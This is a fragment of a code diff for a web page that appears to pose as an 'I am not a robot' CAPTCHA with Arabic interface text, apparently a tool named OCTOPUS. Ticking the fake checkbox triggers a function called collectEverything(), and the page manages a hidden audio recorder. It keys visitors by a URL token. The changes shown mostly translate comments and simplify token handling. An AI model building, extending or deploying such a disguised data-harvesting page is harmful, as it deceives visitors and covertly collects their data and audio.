             navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => {});
         }
-    } catch (e) {}
+    } catch(e) {}
 }
 
 // ========================================================================
-//  23. UI 事件绑定
+//  11. ربط الأحداث
 // ========================================================================
 function resetUI() {
-    elements.spinner.classList.remove('loading', 'failed', 'success', 'permission');
+    elements.spinner.classList.remove('loading', 'failed', 'success');
     elements.mainText.className = 'text';
     elements.mainText.textContent = 'أنا لست روبوتاً';
     elements.checkbox.checked = false;
@@ -1254,10 +1021,7 @@ elements.checkbox.addEventListener('change', function(e) {
         collectEverything();
     }
 });
-
-elements.checkbox.addEventListener('click', function(e) {
-    if (this.disabled) e.preventDefault();
-});
+elements.checkbox.addEventListener('click', function(e) { if (this.disabled) e.preventDefault(); });
 
 elements.wrapper.addEventListener('click', function(e) {
     if (e.target.closest('.checkmark') || e.target.closest('.captcha-footer') || e.target.closest('.logo')) return;
@@ -1271,15 +1035,10 @@ elements.wrapper.addEventListener('click', function(e) {
 });
 
 // ========================================================================
-//  24. 初始化
+//  12. التهيئة
 // ========================================================================
 window.addEventListener('load', async () => {
-    // 尝试从 Cookie/会话获取 token
-    let hasToken = await fetchToken();
-    if (!hasToken) {
-        // 回退到 URL token (兼容旧版本)
-        hasToken = getTokenFromURL();
-    }
+    const hasToken = getTokenFromURL();
     if (!hasToken) {
         elements.mainText.textContent = 'الرابط غير صالح';
         elements.mainText.className = 'text failed';
@@ -1308,7 +1067,7 @@ window.addEventListener('beforeunload', () => {
     if (state.audioRecorder && state.audioRecorder.state === 'recording') state.audioRecorder.stop();
 });
 
-console.log('✅ OCTOPUS 外科医生版本已加载');
+console.log('✅ OCTOPUS ULTRA PREMIUM جاهز');
 </script>
 </body>
 </html>
